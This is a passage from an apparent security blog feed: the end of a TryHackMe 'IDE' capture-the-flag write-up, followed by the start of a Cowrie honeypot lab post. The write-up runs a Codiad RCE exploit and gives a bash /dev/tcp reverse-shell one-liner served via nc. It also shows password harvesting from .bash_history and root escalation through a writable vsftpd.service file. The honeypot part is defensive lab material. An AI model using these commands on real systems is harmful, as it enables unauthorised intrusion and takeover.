&lt;p&gt;For instance, such passwords: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;password&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;toor&lt;/code&gt; can be good candidates.&lt;/p&gt;

&lt;p&gt;After finding out the correct credentials, we can start exploiting the vulnerability that we’ve discovered earlier.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;codiad-284-authenticated-rce&quot;&gt;&lt;strong&gt;Codiad 2.8.4 Authenticated RCE&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;Steps to reproduce the attack:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;1. Copy the exploit to current working directory.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;searchsploit &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; multiple/webapps/49705.py
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;2. On the 1st terminal, we execute the following command:&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3 49705.py http://&lt;span class=&quot;nv&quot;&gt;$IP&lt;/span&gt;:62337/ &lt;span class=&quot;nv&quot;&gt;$USER&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$PASSWORD&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$LIP&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$LPORT&lt;/span&gt; linux
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Please execute the following &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;on your vps: 

...[snip]...

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Please confirm that you have &lt;span class=&quot;k&quot;&gt;done &lt;/span&gt;the two &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;above &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;y/n]
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Y/n] Y &lt;span class=&quot;c&quot;&gt;# Please finish steps 3 &amp;amp; 4 before pressing Y &lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;3. On the 2nd terminal, we continue executing:&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;bash -c &quot;bash -i &amp;gt;/dev/tcp/$LIP/$LPORT+1 0&amp;gt;&amp;amp;1 2&amp;gt;&amp;amp;1&quot;&apos;&lt;/span&gt; | nc &lt;span class=&quot;nt&quot;&gt;-lnvp&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$LPORT&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# if $LPORT is 9001, $LPORT+1 is 9002&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;4. On the 3rd terminal, we set up a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc&lt;/code&gt; listener:&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$LPORT&lt;/span&gt;+1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After entering &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Y&lt;/code&gt;, our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc&lt;/code&gt; should catch a reverse shell as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www-data&lt;/code&gt; after a few seconds.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-lnvp&lt;/span&gt; 9002
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 9002 ...
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.4.1.61] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.190.116] 60068
bash: cannot &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;terminal process group &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;971&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Inappropriate ioctl &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;device
bash: no job control &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this shell
www-data@ide:/var/www/html/codiad/components/filemanager&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;privilege-escalation&quot;&gt;&lt;strong&gt;Privilege Escalation&lt;/strong&gt;&lt;/h2&gt;

&lt;h4 id=&quot;plaintext-password&quot;&gt;&lt;strong&gt;Plaintext Password&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Enumerating the target system exposed a password of user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;drac&lt;/code&gt;, stored in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/drac/.bash_history&lt;/code&gt; file.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@ide:/var/www/html/codiad/components/filemanager&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /home/drac/.bash_history
&amp;lt;omponents/filemanager&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /home/drac/.bash_history      
mysql &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; drac &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;Th[REDACTED]3aL&apos;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Using the newly obtained credentials, we logged in as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;drac&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;system-compromised&quot;&gt;&lt;strong&gt;System Compromised&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Further enumeration reveals that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;drac&lt;/code&gt; can run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo&lt;/code&gt; command …&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;drac@ide:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;drac: 
Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;drac on ide:
    env_reset, mail_badpass,
    &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/snap/bin

User drac may run the following commands on ide:
    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ALL : ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; /usr/sbin/service vsftpd restart
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Besides, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;drac&lt;/code&gt; can also write into the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vsftpd.service&lt;/code&gt; file.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;drac@ide:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find / &lt;span class=&quot;nt&quot;&gt;-writable&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-name&lt;/span&gt; vsftpd&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; f &lt;span class=&quot;nt&quot;&gt;-ls&lt;/span&gt; 2&amp;gt;/dev/null&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
   282032      4 &lt;span class=&quot;nt&quot;&gt;-rw-rw-r--&lt;/span&gt;   1 root     drac          248 Aug  4 07:24 /lib/systemd/system/vsftpd.service
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;To successfully pull a reverse shell, we need to modify the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.service&lt;/code&gt; file. There are various ways to do it, the below is one example:&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ide_thm/1.png&quot; title=&quot;ide_thm/1.png&quot; alt=&quot;ide_thm/1.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;After the file was modified, we’ll setup a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc&lt;/code&gt; listener and restart the daemon &amp;amp; service …&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;drac@ide:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;systemctl daemon-reload                                                         
&lt;span class=&quot;o&quot;&gt;====&lt;/span&gt; AUTHENTICATING FOR org.freedesktop.systemd1.reload-daemon &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt;
Authentication is required to reload the systemd state.
Authenticating as: drac
Password: 
&lt;span class=&quot;o&quot;&gt;====&lt;/span&gt; AUTHENTICATION COMPLETE &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt;
drac@ide:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /usr/sbin/service vsftpd restart
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc&lt;/code&gt; should now spawn a shell as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;!.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 9001
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 9001 ...
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.4.1.61] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.190.116] 56810
bash: cannot &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;terminal process group &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3364&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Inappropriate ioctl &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;device
bash: no job control &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this shell
root@ide:/# &lt;span class=&quot;nb&quot;&gt;id 
id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="webapp" /><category term="red" /><category term="thm" /><summary type="html">Summary</summary></entry><entry><title type="html">Cowrie Honeypot - Honeypot</title><link href="https://jayngng.github.io/blog/cowrie-honeypot/" rel="alternate" type="text/html" title="Cowrie Honeypot - Honeypot" /><published>2021-10-13T07:12:24+11:00</published><updated>2021-10-13T07:12:24+11:00</updated><id>https://jayngng.github.io/blog/cowrie-honeypot</id><content type="html" xml:base="https://jayngng.github.io/blog/cowrie-honeypot/">&lt;h2 id=&quot;lab-description&quot;&gt;&lt;strong&gt;Lab Description&lt;/strong&gt;&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;The lab is provided by TryHackMe - Creators: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CoolComputerMan&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;Link to access the lab: &lt;a href=&quot;https://tryhackme.com/room/introductiontohoneypots&quot;&gt;here&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Our final goal is to comprehend &lt;a href=&quot;https://github.com/cowrie/cowrie&quot;&gt;Cowrie honeypot&lt;/a&gt; and it’s functionalities.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;introduction-to-honeypot&quot;&gt;&lt;strong&gt;Introduction to Honeypot&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;Honeypot is an intentionally vulnerable machine used to attract attackers and record their activites.&lt;/p&gt;

&lt;p&gt;Here are some highlights of Honeypot’s utilities:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Alert administrators of potential breaches.&lt;/li&gt;
  &lt;li&gt;Understand adversaries, i.e. tools and techniques used.&lt;/li&gt;
  &lt;li&gt;Distract attacker away from real infrastructures. This will lend us more time to respond to the attack.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;types-of-honeypots&quot;&gt;&lt;strong&gt;Types of Honeypots&lt;/strong&gt;&lt;/h2&gt;

&lt;h4 id=&quot;honeypot-interactivity-and-classification&quot;&gt;&lt;strong&gt;Honeypot Interactivity and Classification&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;&lt;strong&gt;1. Low-Interaction&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Offer limitation in terms of activities to the adversaries. Basically, the adversaries will be limited in any post-exploitation actions against the Honeypot.&lt;/p&gt;

&lt;p&gt;For instance, &lt;a href=&quot;https://github.com/phin3has/mailoney&quot;&gt;SMTP Honeypot&lt;/a&gt; by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;awhitehatter&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;2. Medium-Interaction&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Emulate real environment such as vulnerable services, and underlying OS, shell and file systems. Yet, attackers cannot fully perform post-exploitation procedures.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/cowrie/cowrie&quot;&gt;Cowrie honeypot&lt;/a&gt; will be a good example.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;3. High-Interaction&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Is usually a Virtual Machines with intentional vulnerabilities. It is crucial to manage this Honeypot well enough, otherwise, adversaries could abuse it as a foundation to compromise other assets.&lt;/p&gt;

&lt;h4 id=&quot;deployment-location&quot;&gt;&lt;strong&gt;Deployment Location&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;&lt;strong&gt;1. Internal honeypots&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Deployed inside LAN. This is typically used as a monitor of a network to hunt threats from the inside.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;2. External honeypots&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Deployed outside LAN. This is typically used as a monitor from outside of a network. This deployment will give us more data since it is likely to be targeted at all times.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;cowrie-honeypot&quot;&gt;&lt;strong&gt;Cowrie Honeypot&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;Cowrie honeypot is a Low-, Medium- Interactive shell. We can try to login via SSH service.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh root@10.10.150.41                                                              
root@10.10.150.41&lt;span class=&quot;s1&quot;&gt;&apos;s password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
root@acmeweb:~# ls 
root@acmeweb:~# ls -al 
drwx------ 1 root root 4096 2013-04-05 12:25 .
drwxr-xr-x 1 root root 4096 2013-04-05 12:03 ..
drwx------ 1 root root 4096 2013-04-05 11:58 .aptitude
-rw-r--r-- 1 root root  570 2013-04-05 11:52 .bashrc
-rw-r--r-- 1 root root  140 2013-04-05 11:52 .profile
drwx------ 1 root root 4096 2013-04-05 12:05 .ssh
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can basically execute any command on the target system. Yet, there are two noticeable things:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;We &lt;strong&gt;can’t&lt;/strong&gt; execute any &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bash&lt;/code&gt; script. This is a limitation of a low and medium honeypot.&lt;/li&gt;
  &lt;li&gt;Trying to create a file, we log back in, the file is deleted.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;cowrie-logs&quot;&gt;&lt;strong&gt;Cowrie Logs&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;Cowrie offers an outstanding ability to log all events that can track every connection and command handled by the system.&lt;/p&gt;

&lt;p&gt;To demonstrate the idea, let’s us inspect a log file.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;cowrie.json | jq &lt;span class=&quot;s1&quot;&gt;&apos;.message&apos;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;New connection: 10.4.1.61:40342 (10.10.150.41:22) [session: b51c7f5d06d4]&quot;&lt;/span&gt; 
&lt;span class=&quot;s2&quot;&gt;&quot;Remote SSH version: SSH-2.0-OpenSSH_8.4p1 Debian-6&quot;&lt;/span&gt; 
&lt;span class=&quot;s2&quot;&gt;&quot;SSH client hassh fingerprint: ae8bd7dd09970555aa4c6ed22adbbf56&quot;&lt;/span&gt; 
&lt;span class=&quot;s2&quot;&gt;&quot;login attempt [root/] succeeded&quot;&lt;/span&gt; 
&lt;span class=&quot;s2&quot;&gt;&quot;Terminal Size: 190 46&quot;&lt;/span&gt; 
&lt;span class=&quot;s2&quot;&gt;&quot;request_env: LANG=en_US.UTF-8&quot;&lt;/span&gt; 
&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; 
&lt;span class=&quot;s2&quot;&gt;&quot;CMD: ls&quot;&lt;/span&gt; 
&lt;span class=&quot;s2&quot;&gt;&quot;CMD: ls -al&quot;&lt;/span&gt; 
&lt;span class=&quot;s2&quot;&gt;&quot;CMD: cat /etc/passwd&quot;&lt;/span&gt; 
&lt;span class=&quot;s2&quot;&gt;&quot;CMD: su phil&quot;&lt;/span&gt; 
&lt;span class=&quot;s2&quot;&gt;&quot;CMD: su phila&quot;&lt;/span&gt; 
&lt;span class=&quot;s2&quot;&gt;&quot;CMD: ls -al&quot;&lt;/span&gt; 
&lt;span class=&quot;s2&quot;&gt;&quot;CMD: ls /home&quot;&lt;/span&gt; 
&lt;span class=&quot;s2&quot;&gt;&quot;CMD: uname -a&quot;&lt;/span&gt; 
&lt;span class=&quot;s2&quot;&gt;&quot;CMD: bash -c &apos;whoami&apos;&quot;&lt;/span&gt; 
&lt;span class=&quot;s2&quot;&gt;&quot;CMD: whoami&quot;&lt;/span&gt; 
&lt;span class=&quot;s2&quot;&gt;&quot;CMD: vi test.sh&quot;&lt;/span&gt; 
&lt;span class=&quot;s2&quot;&gt;&quot;CMD: nano test.sh&quot;&lt;/span&gt; 
&lt;span class=&quot;s2&quot;&gt;&quot;CMD: stty&quot;&lt;/span&gt; 
&lt;span class=&quot;s2&quot;&gt;&quot;CMD: echo &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;whoami&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; &amp;gt; test.sh&quot;&lt;/span&gt; 
&lt;span class=&quot;s2&quot;&gt;&quot;CMD: bash test.sh&quot;&lt;/span&gt; 
&lt;span class=&quot;s2&quot;&gt;&quot;Saved redir contents with SHA-256 33e7267d8409d63707706f95f3d67ee9be5fd3a2c6ffc60856c9baeca1ae3ed4 to var/lib/cowrie/downloads/33e7267d8409d63707706f95f3d67ee9be5fd3a2c6ffc60856c9baeca1ae3ed4&quot;&lt;/span&gt;                                                                                                                                                                                           
&lt;span class=&quot;s2&quot;&gt;&quot;Closing TTY Log: var/lib/cowrie/tty/62b86306def6e51672e9dcfb4ced59089ace9c056c0bc9597a0a49d73ae2a40a after 178 seconds&quot;&lt;/span&gt; 
&lt;span class=&quot;s2&quot;&gt;&quot;Connection lost after 183 seconds&quot;&lt;/span&gt; 
&lt;span class=&quot;s2&quot;&gt;&quot;New connection: 10.4.1.61:40344 (10.10.150.41:22) [session: 2eae2e2585fe]&quot;&lt;/span&gt; 
&lt;span class=&quot;s2&quot;&gt;&quot;Remote SSH version: SSH-2.0-OpenSSH_8.4p1 Debian-6&quot;&lt;/span&gt; 
&lt;span class=&quot;s2&quot;&gt;&quot;SSH client hassh fingerprint: ae8bd7dd09970555aa4c6ed22adbbf56&quot;&lt;/span&gt; 
&lt;span class=&quot;s2&quot;&gt;&quot;login attempt [root/] succeeded&quot;&lt;/span&gt; 
&lt;span class=&quot;s2&quot;&gt;&quot;Terminal Size: 190 44&quot;&lt;/span&gt; 
&lt;span class=&quot;s2&quot;&gt;&quot;request_env: LANG=en_US.UTF-8&quot;&lt;/span&gt; 
&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; 
&lt;span class=&quot;s2&quot;&gt;&quot;CMD: ls&quot;&lt;/span&gt; 
&lt;span class=&quot;s2&quot;&gt;&quot;CMD: ls -al&quot;&lt;/span&gt; 
&lt;span class=&quot;s2&quot;&gt;&quot;CMD: &quot;&lt;/span&gt; 
&lt;span class=&quot;s2&quot;&gt;&quot;Closing TTY Log: var/lib/cowrie/tty/7b69298197ba2c2d62ad31598e0b47682e290c71ff6b87f5e00c3f78c77f3876 after 179 seconds&quot;&lt;/span&gt; 
&lt;span class=&quot;s2&quot;&gt;&quot;Connection lost after 182 seconds&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As we can see, all the system commands are recorded.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; we also notice that if with the external honeypots, it’s practically impossible to parse the log using CLI. To have a better vision, it’s recommended to commbine with logging platform such as ELK Stack.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;attacks-against-ssh&quot;&gt;&lt;strong&gt;Attacks Against SSH&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;Normally, attacks against the SSH service are done via a famous tool named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hydra&lt;/code&gt;. Since Cowrie only leaves one SSH opened, it’s relatively easy to mitigate the attack.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Defense:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Strong password.&lt;/li&gt;
  &lt;li&gt;Public key authentication.&lt;/li&gt;
  &lt;li&gt;Fail2ban&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Those are the most ubiquitous ways to effectively mitigate such attacks.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;typical-post-exploitation-activity&quot;&gt;&lt;strong&gt;Typical Post Exploitation Activity&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;Typically, the bot will perform post-exploitation activities such as:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Check target’s kernel version using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;uname&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nproc&lt;/code&gt;. Besides, they will try to read contents of files such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/issue&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/proc/cpuinfo&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

